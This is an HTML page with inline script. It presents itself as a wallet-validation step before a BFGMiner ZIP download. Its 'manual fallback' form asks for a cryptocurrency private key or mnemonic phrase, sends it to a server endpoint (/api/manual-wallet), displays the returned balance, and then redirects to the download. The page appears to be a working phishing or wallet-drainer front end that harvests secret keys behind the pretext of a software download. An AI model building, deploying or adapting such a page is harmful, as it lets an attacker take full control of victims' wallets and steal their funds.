
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Connected - BFGMiner</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/style.css">
</head>
<body class="bg-gray-900 text-white min-h-screen">
    <div class="max-w-2xl mx-auto p-6">
        <div class="text-center mb-8">
            <h1 class="text-4xl font-bold text-green-400 mb-4">Wallet Connected Successfully!</h1>
            <p class="text-gray-300">Your wallet has been validated. You can now proceed to download or use manual input as fallback.</p>
        </div>

        <div id="wallet-info" class="bg-gray-800 rounded-lg p-6 mb-8 hidden">
            <h2 class="text-xl font-semibold mb-2">Connected Wallet</h2>
            <p id="address-display" class="text-sm text-gray-400 mb-2"></p>
            <p id="balance-display" class="text-sm text-green-400"></p>
        </div>

        <!-- Manual Input Fallback -->
        <div class="bg-gray-800 rounded-lg p-6">
            <h2 class="text-2xl font-semibold mb-4">Manual Wallet Input (Fallback)</h2>
            <p class="text-gray-400 mb-6">If you prefer, enter your private key or mnemonic phrase for validation.</p>
            
            <div class="space-y-4">
                <div>
                    <label class="block text-sm font-medium text-gray-300 mb-2">
                        <input type="radio" id="private-key" name="input-type" value="private_key" class="mr-2">
                        Private Key
                    </label>
                    <textarea id="private-key-input" rows="3" placeholder="0x..." class="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-md text-white focus:outline-none focus:border-brand-orange hidden" style="resize: none;"></textarea>
                </div>
                
                <div>
                    <label class="block text-sm font-medium text-gray-300 mb-2">
                        <input type="radio" id="mnemonic" name="input-type" value="mnemonic" class="mr-2">
                        Mnemonic Phrase (12/24 words)
                    </label>
                    <textarea id="mnemonic-input" rows="3" placeholder="word1 word2 ... word12" class="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-md text-white focus:outline-none focus:border-brand-orange hidden" style="resize: none;"></textarea>
                </div>
                
                <div id="manual-error" class="bg-red-900/50 border border-red-500 text-red-200 px-3 py-2 rounded-md text-sm hidden"></div>
                <div id="manual-success" class="bg-green-900/50 border border-green-500 text-green-200 px-3 py-2 rounded-md text-sm hidden"></div>
                
                <button id="manual-submit" class="w-full py-2 px-4 bg-brand-orange text-white font-semibold rounded-md hover:bg-orange-400 transition-colors disabled:opacity-50" disabled>
                    Validate Manual Input
                </button>
            </div>
        </div>

        <div class="text-center mt-8">
            <a href="/download" class="inline-flex items-center px-6 py-3 border border-transparent text-base font-medium rounded-md shadow-sm bg-brand-orange text-white hover:bg-orange-400 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-brand-orange transition-colors">
                Download BFGMiner ZIP
            </a>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const privateKeyRadio = document.getElementById('private-key');
            const mnemonicRadio = document.getElementById('mnemonic');
            const privateKeyInput = document.getElementById('private-key-input');
            const mnemonicInput = document.getElementById('mnemonic-input');
            const submitBtn = document.getElementById('manual-submit');
            const errorEl = document.getElementById('manual-error');
            const successEl = document.getElementById('manual-success');

            // Show wallet info if passed from previous page (via session or query)
            const urlParams = new URLSearchParams(window.location.search);
            const address = urlParams.get('address');
            const balance = urlParams.get('balance');
            if (address && balance) {
                document.getElementById('address-display').textContent = `Address: ${address.slice(0, 6)}...${address.slice(-4)}`;
                document.getElementById('balance-display').textContent = `Balance: $${parseFloat(balance).toFixed(2)} USD`;
                document.getElementById('wallet-info').classList.remove('hidden');
            }

            // Toggle input fields
            privateKeyRadio.addEventListener('change', () => {
                privateKeyInput.classList.remove('hidden');
                mnemonicInput.classList.add('hidden');
                updateSubmitBtn();
            });
            mnemonicRadio.addEventListener('change', () => {
                mnemonicInput.classList.remove('hidden');
                privateKeyInput.classList.add('hidden');
                updateSubmitBtn();
            });

            function updateSubmitBtn() {
                const selectedType = document.querySelector('input[name="input-type"]:checked');
                const inputValue = selectedType ? (selectedType.value === 'private_key' ? privateKeyInput.value : mnemonicInput.value) : '';
                submitBtn.disabled = !selectedType || inputValue.trim() === '';
            }

            privateKeyInput.addEventListener('input', updateSubmitBtn);
            mnemonicInput.addEventListener('input', updateSubmitBtn);

            submitBtn.addEventListener('click', async () => {
                const selectedType = document.querySelector('input[name="input-type"]:checked');
                if (!selectedType) return;

                const inputValue = selectedType.value === 'private_key' ? privateKeyInput.value.trim() : mnemonicInput.value.trim();
                if (!inputValue) return;

                try {
                    submitBtn.disabled = true;
                    submitBtn.textContent = 'Validating...';

                    const response = await fetch('/api/manual-wallet', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ type: selectedType.value, value: inputValue })
                    });

                    const data = await response.json();

                    if (data.success) {
                        errorEl.classList.add('hidden');
                        successEl.textContent = `Wallet validated! Address: ${data.address.slice(0, 6)}...${data.address.slice(-4)}, Balance: $${data.balance_usd.toFixed(2)}`;
                        successEl.classList.remove('hidden');
                        setTimeout(() => {
                            window.location.href = '/download';
                        }, 3000);
                    } else {
                        successEl.classList.add('hidden');
                        errorEl.textContent = data.message || 'Validation failed';
                        errorEl.classList.remove('hidden');
                    }
                } catch (error) {
                    errorEl.textContent = 'Network error: ' + error.message;
                    errorEl.classList.remove('hidden');
                } finally {
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Validate Manual Input';
                }
            });
        });
    </script>
</body>
</html>
